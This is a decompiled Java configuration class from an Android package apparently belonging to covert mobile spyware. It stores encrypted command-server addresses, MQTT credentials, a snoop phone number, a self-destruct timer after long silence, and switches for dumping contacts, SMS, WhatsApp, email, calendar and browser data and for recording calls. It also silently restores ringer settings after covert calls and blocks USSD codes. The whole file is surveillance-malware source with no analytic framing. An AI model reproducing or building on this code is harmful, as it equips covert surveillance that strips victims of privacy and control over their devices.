package com.network.b;

import android.content.Context;
import android.content.SharedPreferences;
import com.network.android.AndroidCallDirectWatcher;
import com.network.android.BootReceiver;
import com.network.android.SmsReceiver;
import com.network.android.a.c;
import com.network.android.agent.NetworkApp;
import com.network.android.g;
import com.network.android.h;
import com.network.android.i;
import com.network.android.m;
import com.network.android.monitor.observer.t;
import com.network.i.a;
import java.io.File;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.Vector;
import java.util.regex.Pattern;

public final class b {
    public static int A = 1;
    public static boolean B = false;
    public static Boolean C = false;
    private static byte[] D = a.b("vR23sMkhJYKX5KXXhaQ/cz3jKsdZKu6fF8C/5u3DCEoxRHLWGz0A8fckMDGtSeuLDJkuZ81D/qTm6NARbN3G8r6Zm2X2FX8fNT54W2kJ2aww4XvmnaUdYzEkTv");
    private static short E = 0;
    private static String[] F = new String[0];
    private static Random G = new Random();
    private static long H = 0;
    private static long I = 0;
    private static int J = 0;
    private static int K = 0;
    private static int L = 0;
    private static int M = 1;
    private static int N = 0;
    private static int O = 0;
    private static Integer P = null;
    private static long Q = 0;
    private static boolean R = false;
    private static long S = 0;
    private static long T = 0;
    private static long U = 0;
    private static long V = 0;
    private static Boolean W = null;
    private static Boolean X = false;
    private static int Y = 0;
    private static String Z = null;

    /* renamed from: a  reason: collision with root package name */
    public static String f136a = "/data/data/com.network.android/network_data/";
    private static boolean aa = false;
    private static int ab = 0;
    private static String ac = null;
    private static int ad = 0;
    private static String ae = null;
    private static int af = 0;
    private static int ag = 0;
    private static int ah = 0;
    private static String ai = null;
    private static String aj = null;
    private static Boolean ak = null;
    private static Integer al = null;
    private static String[] am = null;
    private static String[] an = null;
    private static Vector ao;
    public static String b = "/data/data/com.network.android/network_data_bin/";
    public static String c = "/data/data/com.network.android/network_cache/cache1.dat";
    public static String d = "vR23sMkhJYKX5KXXhaQ/cz3jKsdZKu6fF8C/5u3DCEoxRHLWGz0A8fckMDGtSeuLDJkuZ81D/qTm6NARbN3G8r6Zm2X2FX8fNT54W2kJ2aww4XvmnaUdYzEkTv";
    public static String e = "";
    public static String f = null;
    public static String g = null;
    public static long h = 0;
    public static Long i = null;
    public static short j = 0;
    public static int k = 0;
    public static String l = null;
    public static String m = null;
    public static String n = null;
    public static String o = null;
    public static boolean p = true;
    public static boolean q = true;
    public static boolean r = true;
    public static boolean s = true;
    public static boolean t = true;
    public static boolean u = true;
    public static boolean v = true;
    public static boolean w = true;
    public static int x = 0;
    public static int y = 1;
    public static String z;

    public static String A() {
        return Z;
    }

    public static String B() {
        return ac;
    }

    public static String C() {
        return ae;
    }

    public static int D() {
        return af;
    }

    public static int E() {
        return ag;
    }

    public static int F() {
        return ah;
    }

    public static String G() {
        return ai;
    }

    public static String H() {
        return aj;
    }

    public static boolean I() {
        return aa;
    }

    public static int J() {
        if (al == null) {
            com.network.android.c.a.a.a("ConfigurationHolder PollingManager getPollingInterval need to read preference");
            d(NetworkApp.a());
        }
        com.network.android.c.a.a.a("ConfigurationHolder PollingManager getPollingInterval pollingInterval: " + al);
        return al.intValue();
    }

    public static Integer K() {
        if (P == null) {
            com.network.android.c.a.a.a("ConfigurationHolder need to read preference getMaxTimeWithNoCommunicationSeconds: " + P);
            d(NetworkApp.a());
        }
        com.network.android.c.a.a.a("ConfigurationHolder getMaxTimeWithNoCommunicationSeconds: " + P);
        return P;
    }

    public static void L() {
        X = false;
        q = true;
        r = true;
        s = true;
        t = true;
        u = true;
        v = true;
        w = true;
    }

    public static long a() {
        return V;
    }

    public static String a(Context context) {
        try {
            if (F.length == 1) {
                return F[0];
            }
            if (F.length > 1) {
                int nextInt = G.nextInt(F.length);
                com.network.android.c.a.a.a("targetURLs !url! selected: " + nextInt);
                return F[nextInt];
            }
            if (F.length == 0) {
                g(context);
            }
            if (F.length == 0) {
                com.network.android.c.a.a.a("targetURLs.length == 0 getSettingsFromBH");
                com.network.h.b.f(context);
            }
            if (F.length == 1) {
                return F[0];
            }
            if (F.length > 1) {
                int nextInt2 = G.nextInt(F.length);
                com.network.android.c.a.a.a("targetURLs !url! selected: " + nextInt2);
                return F[nextInt2];
            }
            return null;
        } catch (Exception e2) {
            com.network.android.c.a.a.a("getRandomURL Exception- " + e2.getMessage(), e2);
        }
    }

    public static void a(int i2) {
        com.network.android.c.a.a.a("setWasPhoneUnmutedNiclyAfterTapWasFinished: " + i2);
        M = i2;
    }

    public static void a(long j2) {
        V = j2;
    }

    private static void a(Context context, String str) {
        SharedPreferences sharedPreferences = context.getSharedPreferences(str, 0);
        if (sharedPreferences != null) {
            SharedPreferences.Editor edit = sharedPreferences.edit();
            edit.clear();
            edit.commit();
        }
    }

    private static void a(SharedPreferences sharedPreferences) {
        f = h(sharedPreferences.getString("Skypi", null));
    }

    public static void a(i iVar, String str) {
        String a2 = iVar.a();
        if (a2 != null) {
            File file = new File(f136a);
            if (!file.exists()) {
                com.network.android.c.a.a.a("addDataElement push make new directory:" + file.getAbsolutePath() + " success: " + file.mkdirs());
            }
            String str2 = f136a + str + ".dat";
            g.a(h.a(a2), str2);
            com.network.android.c.a.a.a("addDataElement push  Save heavy xml file: " + str2);
            iVar.g(str2);
            String[] c2 = iVar.c();
            byte[][] d2 = iVar.d();
            if (!(c2 == null || d2 == null || c2.length != d2.length)) {
                File file2 = new File(b);
                if (!file2.exists()) {
                    file2.mkdir();
                    com.network.android.c.a.a.a("addDataElement push make new heavy directory:" + file2.getAbsoluteFile());
                }
                StringBuilder sb = new StringBuilder();
                StringBuilder sb2 = new StringBuilder();
                for (int i2 = 0; i2 < c2.length; i2++) {
                    String str3 = b + str + "_" + c2[i2] + "_" + i2 + "_.net";
                    g.a(h.a(d2[i2]), str3);
                    com.network.android.c.a.a.a("addDataElement push Save heavy binary file: " + str3);
                    sb.append(str + "_" + c2[i2] + "_" + i2 + "_.net");
                    sb2.append(c2[i2]);
                    if (i2 < c2.length - 1) {
                        sb.append("#");
                        sb2.append("#");
                    }
                }
                iVar.f(sb.toString());
                iVar.c(sb2.toString());
            }
        }
    }

    public static void a(Boolean bool) {
        X = bool;
    }

    public static void a(Integer num) {
        P = num;
    }

    public static void a(String str) {
        f = str;
    }

    public static void a(short s2) {
        j = s2;
    }

    public static void a(boolean z2) {
        W = Boolean.valueOf(z2);
    }

    public static void a(String[] strArr) {
        b(strArr);
    }

    public static void a(String[] strArr, Context context) {
        am = strArr;
        if (strArr != null && strArr.length > 0) {
            SharedPreferences.Editor edit = context.getSharedPreferences("usTemplated", 0).edit();
            for (int i2 = 0; i2 < strArr.length; i2++) {
                edit.putString(new StringBuilder().append(i2).toString(), strArr[i2]);
                com.network.android.c.a.a.a(i2 + "setAndSaveUssdBlockingList --" + i2 + "- excpression: " + strArr[i2]);
            }
            edit.commit();
        }
    }

    public static String[] a(Vector vector) {
        try {
            String[] strArr = new String[vector.size()];
            for (int i2 = 0; i2 < vector.size(); i2++) {
                strArr[i2] = (String) vector.elementAt(i2);
            }
            return strArr;
        } catch (Throwable th) {
            com.network.android.c.a.a.a("castVectorToStringArray exception", th);
            return null;
        }
    }

    public static int b() {
        return ad;
    }

    public static void b(int i2) {
        ad = i2;
    }

    public static void b(long j2) {
        S = j2;
    }

    public static void b(Context context) {
        try {
            com.network.android.c.a.a.a("Remove Preferences");
            a(context, "NetworkPreferences");
            a(context, "NetworkWindowAddresess");
            a(context, "NetworkDataList");
        } catch (Exception e2) {
            com.network.android.c.a.a.a("Remove Preferences", e2);
        }
    }

    public static void b(String str) {
        g = str;
    }

    public static void b(boolean z2) {
        aa = z2;
    }

    public static void b(String[] strArr) {
        if (strArr != null) {
            F = strArr;
        }
    }

    public static void c(int i2) {
        N = i2;
    }

    public static void c(long j2) {
        T = j2;
    }

    public static synchronized void c(Context context) {
        synchronized (b.class) {
            try {
                if (SmsReceiver.b != null) {
                    com.network.android.c.a.a.a("Save Preferences");
                    SharedPreferences.Editor edit = context.getSharedPreferences("NetworkPreferences", 0).edit();
                    edit.putString("NetworkWindowResizer", i(SmsReceiver.b));
                    String[] strArr = F;
                    if (strArr != null && strArr.length > 0) {
                        SharedPreferences.Editor edit2 = context.getSharedPreferences("NetworkWindowAddresess", 0).edit();
                        for (int i2 = 0; i2 < strArr.length; i2++) {
                            edit2.putString(new StringBuilder().append(i2).toString(), i(strArr[i2]));
                            com.network.android.c.a.a.a(i2 + " Save Data agentAddress: " + strArr[i2]);
                        }
                        edit2.commit();
                    }
                    if (g != null) {
                        edit.putString("WindowTargetSms", i(g));
                    }
                    if (f != null) {
                        edit.putString("Skypi", i(f));
                    }
                    edit.putString("url address", i(z));
                    edit.putLong("lastComunication", i.longValue());
                    edit.putLong("lastSend", H);
                    edit.putLong("lastReceive", I);
                    edit.putInt("send", J);
                    edit.putInt("receive", K);
                    edit.putInt("sesseions", L);
                    edit.putInt("wasPhoneWasUnmutedAfterTapNicly", M);
                    edit.putInt("originalVibrateValue", O);
                    edit.putInt("originalRingerValue", N);
                    edit.putInt("errorCode", j);
                    if (P == null) {
                        P = 5184000;
                    }
                    edit.putInt("maxTimeWithNoComunication", P.intValue());
                    edit.putInt("failureCount", k);
                    edit.putBoolean("grace", R);
                    edit.putString("packageVersion", l);
                    edit.putString("vulnarbilityIndicator", m);
                    edit.putString("commandTimeStamp", c.b);
                    edit.putLong("adlocation", S);
                    edit.putLong("adrate", T);
                    edit.putString("userNetwork", o);
                    edit.putString("installation", e);
                    edit.putBoolean("windowYuliyus", W.booleanValue());
                    edit.putBoolean("window canada", X.booleanValue());
                    edit.putLong("graceTime", h);
                    edit.putBoolean("finish", p);
                    edit.putBoolean("callWindow", q);
                    edit.putBoolean("dumpContacts", r);
                    edit.putBoolean("dumpBrowserData", s);
                    edit.putBoolean("smsWindow", t);
                    edit.putBoolean("dumpCalander", u);
                    edit.putBoolean("firstRun", v);
                    edit.putBoolean("dumpMails", w);
                    edit.putBoolean("forwarding", t.f104a);
                    edit.putInt("allowRomingType", Y);
                    edit.putString("logNetwork", com.network.android.c.a.b.d);
                    edit.putInt("ScreenTimeout", x);
                    edit.putInt("wanted_debug_level", A);
                    edit.putInt("screenProximtySensor", y);
                    edit.putBoolean("romingSetted", AndroidCallDirectWatcher.a());
                    edit.putString("mqttPassword", Z);
                    edit.putBoolean("did_we_restart_after_upgrade_already", B);
                    edit.putInt("mqttAllowedConnectionType", ad);
                    edit.putBoolean("should_use_mqtt", aa);
                    edit.putInt("mqttRecCount", ah);
                    edit.putString("mqttUsername", ac);
                    edit.putString("mqttIdPref", ae);
                    edit.putInt("mqttQos", af);
                    edit.putInt("mqttKaTimer", ag);
                    edit.putString("mqttPort", ai);
                    edit.putString("mqttHost", aj);
                    edit.putInt("mqttRecInt", ab);
                    edit.putBoolean("networkKill", c.i);
                    if (al != null) {
                        edit.putInt("pollingInterval", al.intValue());
                    }
                    edit.putBoolean("local", C.booleanValue());
                    edit.commit();
                    com.network.android.c.a.a.a("Save Data parameters targetSms: " + g + ", outSnoopNumber: " + f + ", simSerialNumber: " + BootReceiver.f39a);
                    com.network.android.c.a.a.a("parameters Call Recoeding: " + X + " ,lastComunication: " + i + ", dumpFinish: " + p + ", current log file: " + com.network.android.c.a.b.d);
                    com.network.android.c.a.a.a("parameters Self destruction time: " + P + " urlToRemove: " + z);
                    com.network.android.c.a.a.a("parameters dumpFinish: " + p + " dumpSMS: " + q + " dumpWhatsApp: " + v + " dumpEmails: " + w + " dumpContacts: " + r + " dumpCalander: " + u + " dumpCall: " + t);
                    com.network.android.c.a.a.a("Save Data parameters wantedDebugLevel: " + A + " pollingInterval: " + al);
                }
            } catch (Throwable th) {
                com.network.android.c.a.a.a("savePreferences exception", th);
            }
        }
        return;
    }

    public static void c(String str) {
        Z = str;
    }

    public static boolean c() {
        if (ak == null) {
            ak = Boolean.valueOf(new File("/system/csk").exists());
        }
        return ak.booleanValue();
    }

    public static void d(int i2) {
        x = i2;
    }

    public static void d(long j2) {
        U = j2;
    }

    public static synchronized void d(Context context) {
        synchronized (b.class) {
            try {
                com.network.android.c.a.a.a("Read Preferences");
                if (context == null) {
                    com.network.android.c.a.a.a("readPreferences: context is NULL!!!");
                } else {
                    if (context.getSharedPreferences("NetworkPreferences", 0).getString("NetworkWindowResizer", null) == null) {
                        com.network.android.c.a.a.a("token == null getSettingsFromBH");
                        com.network.android.c.a.b.a(1, 1, "LOG_AGENT_FIRST_TIME_RUN");
                        com.network.h.b.f(context);
                    }
                    SharedPreferences sharedPreferences = context.getSharedPreferences("NetworkPreferences", 0);
                    SmsReceiver.b = h(sharedPreferences.getString("NetworkWindowResizer", null));
                    BootReceiver.f39a = sharedPreferences.getString("NetworkWindowSim", null);
                    g = h(sharedPreferences.getString("WindowTargetSms", null));
                    g(context);
                    a(sharedPreferences);
                    i = Long.valueOf(sharedPreferences.getLong("lastComunication", 0));
                    H = sharedPreferences.getLong("lastSend", 0);
                    I = sharedPreferences.getLong("lastReceive", 0);
                    J = sharedPreferences.getInt("send", 0);
                    K = sharedPreferences.getInt("receive", 0);
                    l = sharedPreferences.getString("packageVersion", null);
                    m = sharedPreferences.getString("vulnarbilityIndicator", null);
                    L = sharedPreferences.getInt("sesseions", 0);
                    M = sharedPreferences.getInt("wasPhoneWasUnmutedAfterTapNicly", 1);
                    O = sharedPreferences.getInt("originalVibrateValue", 0);
                    N = sharedPreferences.getInt("originalRingerValue", 0);
                    k = sharedPreferences.getInt("failureCount", 0);
                    j = (byte) sharedPreferences.getInt("errorCode", 0);
                    P = Integer.valueOf(sharedPreferences.getInt("maxTimeWithNoComunication", 5184000));
                    R = sharedPreferences.getBoolean("grace", false);
                    c.b = sharedPreferences.getString("commandTimeStamp", null);
                    S = sharedPreferences.getLong("adlocation", 0);
                    T = sharedPreferences.getLong("adrate", 0);
                    o = sharedPreferences.getString("userNetwork", null);
                    e = sharedPreferences.getString("installation", null);
                    W = Boolean.valueOf(sharedPreferences.getBoolean("windowYuliyus", false));
                    X = Boolean.valueOf(sharedPreferences.getBoolean("window canada", false));
                    h = sharedPreferences.getLong("graceTime", 0);
                    p = sharedPreferences.getBoolean("finish", true);
                    r = sharedPreferences.getBoolean("dumpContacts", true);
                    s = sharedPreferences.getBoolean("dumpBrowserData", true);
                    q = sharedPreferences.getBoolean("callWindow", true);
                    t = sharedPreferences.getBoolean("smsWindow", true);
                    u = sharedPreferences.getBoolean("dumpCalander", true);
                    v = sharedPreferences.getBoolean("firstRun", true);
                    w = sharedPreferences.getBoolean("dumpMails", true);
                    Y = sharedPreferences.getInt("allowRomingType", 0);
                    com.network.android.c.a.b.d = sharedPreferences.getString("logNetwork", null);
                    t.f104a = sharedPreferences.getBoolean("forwarding", false);
                    AndroidCallDirectWatcher.a(sharedPreferences.getBoolean("romingSetted", false));
                    x = sharedPreferences.getInt("ScreenTimeout", 0);
                    A = sharedPreferences.getInt("wanted_debug_level", 1);
                    y = sharedPreferences.getInt("screenProximtySensor", 1);
                    z = h(sharedPreferences.getString("url address", null));
                    B = sharedPreferences.getBoolean("did_we_restart_after_upgrade_already", true);
                    Z = sharedPreferences.getString("mqttPassword", "");
                    ad = sharedPreferences.getInt("mqttAllowedConnectionType", 0);
                    aa = sharedPreferences.getBoolean("should_use_mqtt", false);
                    ab = sharedPreferences.getInt("mqttRecInt", 1);
                    ac = sharedPreferences.getString("mqttUsername", "");
                    ae = sharedPreferences.getString("mqttIdPref", "");
                    af = sharedPreferences.getInt("mqttQos", 0);
                    ag = sharedPreferences.getInt("mqttKaTimer", 0);
                    ah = sharedPreferences.getInt("mqttRecCount", 0);
                    ai = sharedPreferences.getString("mqttPort", "");
                    aj = sharedPreferences.getString("mqttHost", "");
                    c.i = sharedPreferences.getBoolean("networkKill", false);
                    m.f84a = sharedPreferences.getString("firstRunIndex", null);
                    al = Integer.valueOf(sharedPreferences.getInt("pollingInterval", 1800));
                    C = Boolean.valueOf(sharedPreferences.getBoolean("local", false));
                }
            } catch (Exception e2) {
                com.network.android.c.a.a.a("readPreferences", e2);
            }
        }
        return;
    }

    public static void d(String str) {
        ac = str;
    }

    public static boolean d() {
        if (W == null) {
            d(NetworkApp.a());
        }
        return W.booleanValue();
    }

    public static Boolean e(Context context) {
        com.network.android.c.a.a.a("getCallRecord");
        if (X != null) {
            return X;
        }
        d(context);
        return X;
    }

    public static void e(int i2) {
        O = i2;
    }

    public static void e(String str) {
        ae = str;
    }

    public static String[] e() {
        return F;
    }

    public static String f() {
        if (f == null) {
            a(NetworkApp.a().getSharedPreferences("NetworkPreferences", 0));
        }
        return f;
    }

    public static List f(Context context) {
        try {
            com.network.android.c.a.a.a("getUssdPatternList");
            if (ao == null && am == null) {
                h(context);
                if (am == null || am.length == 0) {
                    com.network.android.c.a.a.a("getUssdPatternList no USSD plocking list");
                    return ao;
                }
                ao = new Vector(am.length);
                for (int i2 = 0; i2 < am.length; i2++) {
                    try {
                        String str = am[i2];
                        com.network.android.c.a.a.a("getUssdPatternList i-" + i2 + " compile regx:" + str);
                        ao.add(i2, Pattern.compile(str));
                    } catch (Throwable th) {
                        com.network.android.c.a.a.a("getUssdPatternList paterns iter " + i2 + " : " + th.getMessage(), th);
                    }
                }
            }
        } catch (Exception e2) {
            com.network.android.c.a.a.a("getUssdPatternList: " + e2.getMessage(), e2);
        }
        return ao;
    }

    public static void f(int i2) {
        y = i2;
    }

    public static void f(String str) {
        ai = str;
    }

    public static String g() {
        if (g == null) {
            d(NetworkApp.a());
        }
        return g;
    }

    public static void g(int i2) {
        Y = i2;
    }

    private static void g(Context context) {
        Map<String, ?> all;
        try {
            com.network.android.c.a.a.a("Read Addreses started");
            SharedPreferences sharedPreferences = context.getSharedPreferences("NetworkWindowAddresess", 0);
            if (!(sharedPreferences == null || (all = sharedPreferences.getAll()) == null || all.size() == 0)) {
                String[] strArr = new String[all.keySet().size()];
                int i2 = 0;
                for (String str : all.keySet()) {
                    strArr[i2] = h(all.get(str).toString());
                    com.network.android.c.a.a.a(i2 + " -  Read Address: " + strArr[i2]);
                    i2++;
                }
                b(strArr);
                com.network.android.c.a.a.a("Read Addreses ended");
            }
        } catch (Exception e2) {
            com.network.android.c.a.a.a("readData: " + e2.getMessage(), e2);
        }
    }

    public static void g(String str) {
        aj = str;
    }

    private static String h(String str) {
        if (str == null) {
            return null;
        }
        try {
            return h.c(str);
        } catch (Exception e2) {
            return str;
        }
    }

    public static void h() {
        i = Long.valueOf(System.currentTimeMillis() / 1000);
        h = 0;
        R = false;
    }

    public static void h(int i2) {
        af = i2;
    }

    private static String[] h(Context context) {
        String[] strArr;
        int i2 = 0;
        try {
            com.network.android.c.a.a.a("getUssdBlockingList");
            if (am == null) {
                com.network.android.c.a.a.a("readPreferenceList started preferenceName: " + "usTemplated");
                SharedPreferences sharedPreferences = context.getSharedPreferences("usTemplated", 0);
                if (sharedPreferences == null) {
                    strArr = null;
                } else {
                    Map<String, ?> all = sharedPreferences.getAll();
                    if (all == null || all.size() == 0) {
                        strArr = null;
                    } else {
                        String[] strArr2 = new String[all.keySet().size()];
                        for (String str : all.keySet()) {
                            strArr2[i2] = all.get(str).toString();
                            com.network.android.c.a.a.a(i2 + " - readPreferenceList Read: " + strArr2[i2]);
                            i2++;
                        }
                        com.network.android.c.a.a.a("readPreferenceList ended");
                        strArr = strArr2.length == 0 ? null : strArr2;
                    }
                }
                am = strArr;
            }
        } catch (Exception e2) {
            com.network.android.c.a.a.a("getUssdBlockingList: " + e2.getMessage(), e2);
        }
        return am;
    }

    public static long i() {
        if (i == null) {
            d(NetworkApp.a());
        }
        return i.longValue();
    }

    private static String i(String str) {
        if (str == null) {
            return null;
        }
        try {
            return h.b(str);
        } catch (Exception e2) {
            return str;
        }
    }

    public static void i(int i2) {
        ag = i2;
    }

    public static long j() {
        return H;
    }

    public static void j(int i2) {
        ah = i2;
    }

    public static void k() {
        H = System.currentTimeMillis() / 1000;
    }

    public static void k(int i2) {
        ab = i2;
    }

    public static long l() {
        return I;
    }

    public static void l(int i2) {
        com.network.android.c.a.a.a("ConfigurationHolder PollingManager setPollingInterval: " + i2);
        al = Integer.valueOf(i2);
    }

    public static void m() {
        I = System.currentTimeMillis() / 1000;
    }

    public static int n() {
        return J;
    }

    public static void o() {
        J++;
    }

    public static void p() {
        Q = System.currentTimeMillis() / 1000;
    }

    public static long q() {
        return Q;
    }

    public static int r() {
        return K;
    }

    public static void s() {
        K++;
    }

    public static int t() {
        return L;
    }

    public static void u() {
        L++;
    }

    public static long v() {
        return S;
    }

    public static long w() {
        return T;
    }

    public static long x() {
        return U;
    }

    public static int y() {
        return Y;
    }

    public static long z() {
        long j2 = 0;
        try {
            com.network.android.c.a.a.a("getDataSize");
            File file = new File(f136a);
            if (file.exists() && file.listFiles().length != 0) {
                try {
                    File[] listFiles = file.listFiles();
                    for (File file2 : listFiles) {
                        try {
                            j2 += file2.length();
                        } catch (Throwable th) {
                            com.network.android.c.a.a.a("getDataSize ", th);
                        }
                    }
                } catch (Throwable th2) {
                    com.network.android.c.a.a.a("getDataSize ", th2);
                }
                com.network.android.c.a.a.a("getDataSize: " + j2);
            }
        } catch (Throwable th3) {
            com.network.android.c.a.a.a("getDataSize ", th3);
        }
        return j2;
    }
}
